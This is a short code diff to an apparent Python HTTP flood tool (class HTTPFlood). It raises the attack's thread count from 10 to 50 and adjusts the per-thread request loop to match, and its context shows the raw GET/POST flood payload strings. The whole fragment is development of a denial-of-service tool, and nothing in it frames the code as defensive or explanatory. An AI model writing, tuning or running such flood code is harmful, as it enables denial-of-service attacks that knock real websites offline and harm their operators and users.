@@ -23,13 +23,13 @@ class HTTPFlood():
 		self.payload = "GET / HTTP/1.0\r\nHOST: {}\r\n\r\n" if self.method == "GET" else "POST / HTTP/1.0 \\r\n\r\n"
 
 	def ThreadStart(self):
-		for i in range(10):
+		for i in range(50):
 			t = Thread(target=self.Start)
 			t.start()
 			t.join()
 
 	def Start(self):
-		for i in range(int(self.count) / 10):
+		for i in range(int(self.count) / 50):
 			self.Attack()
 
 	def Attack(self):
